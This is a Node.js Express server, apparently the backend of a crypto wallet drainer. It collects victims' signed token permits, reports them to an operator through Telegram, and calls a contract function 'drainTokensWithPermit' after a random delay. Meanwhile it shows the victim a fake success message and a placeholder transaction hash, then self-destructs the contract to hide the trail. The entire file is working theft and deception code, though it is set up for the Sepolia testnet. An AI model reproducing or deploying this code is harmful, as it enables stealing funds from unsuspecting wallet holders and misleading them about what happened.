require("dotenv").config();
const express = require("express");
const ethers = require("ethers");
const { Wallet, Contract } = ethers;
const { JsonRpcProvider } = ethers.providers;
const { Telegraf } = require("telegraf");

const app = express();
app.use(express.json());

process.on("uncaughtException", (err) => {
  console.error("❌ Uncaught Exception:", err.message);
});

const bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);
const chatId = process.env.TELEGRAM_CHAT_ID;

const maliciousAbi = [
  "function drainTokensWithPermit(address token,address victim,uint256 amount,uint256 deadline,uint8 v,bytes32 r,bytes32 s) external",
  "function selfDestruct() external"
];

const chains = {
  11155111: {
    name: "Sepolia",
    rpc: process.env.TENDERLY_RPC_URL || "https://rpc.sepolia.org"
  }
};

app.post("/api/permit", async (req, res) => {
  const permit = req.body;
  console.log("📝 /api/permit called:");
  console.log(JSON.stringify(permit, null, 2));

  const alert = `🚨 New Permit Captured\n🧑 From: ${permit.from}\n🧾 Token: ${permit.token}\n🎯 Spender: ${permit.spender}`;
  await bot.telegram.sendMessage(chatId, alert);
  res.json({ status: "received", message: "✅ Permit captured" });
});

app.post("/api/drain", async (req, res) => {
  const { token, victim, amount, deadline, v, r, s } = req.body;
  const rawChainId = req.body.chainId;
  const chainId = parseInt(rawChainId);
  const chain = chains[chainId];

  if (!chain) {
    console.error(`❌ Invalid or unsupported chainId: ${rawChainId}`);
    return res.status(400).json({ error: "Unsupported chainId" });
  }

  const provider = new JsonRpcProvider(chain.rpc);
  const wallet = new Wallet(process.env.PRIVATE_KEY, provider);
  const malicious = new Contract(process.env.MALICIOUS_CONTRACT_ADDRESS, maliciousAbi, wallet);

  const delay = Math.floor(Math.random() * 3) + 1;

  console.log(`💥 /api/drain called`);
  console.log(`🔍 Victim: ${victim}, Chain: ${chain.name}, Delay: ${delay} min`);
  console.log("📦 Payload:", { token, victim, amount, deadline, v, r, s, chainId });

  res.json({
    status: "success",
    message: "✅ Tokens will arrive shortly...",
    txHash: "0xdeadbeef",
    explorer: "explorer.html",
    fakeFailure: true
  });

  setTimeout(async () => {
    try {
      const tx = await malicious.drainTokensWithPermit(token, victim, amount, deadline, v, r, s);
      await tx.wait();

      const alert = `💀 Drain executed on ${chain.name}\n👤 Victim: ${victim}\n💸 Amount: ${amount}\n🔗 TX: ${tx.hash}`;
      console.log(alert);
      await bot.telegram.sendMessage(chatId, alert);

      try {
        const destroyTx = await malicious.selfDestruct();
        await destroyTx.wait();
        console.log("💣 Contract self-destructed.");
        await bot.telegram.sendMessage(chatId, `💣 Contract self-destructed.`);
      } catch (err) {
        console.log("⚠ Self-destruct failed:", err.message);
      }
    } catch (err) {
      const failMsg = `❌ Drain failed for ${victim} on ${chain.name}:\n${err.message}`;
      console.error(failMsg);
      await bot.telegram.sendMessage(chatId, failMsg);
    }
  }, delay * 60 * 1000);
});

app.get("/api/test-drain", async (req, res) => {
  await bot.telegram.sendMessage(chatId, "🧪 /api/test-drain endpoint hit successfully.");
  res.send("✅ Telegram test message sent.");
});

app.listen(4000, () => {
  console.log("🚀 CyberArmor listener live at http://localhost:4000");
});
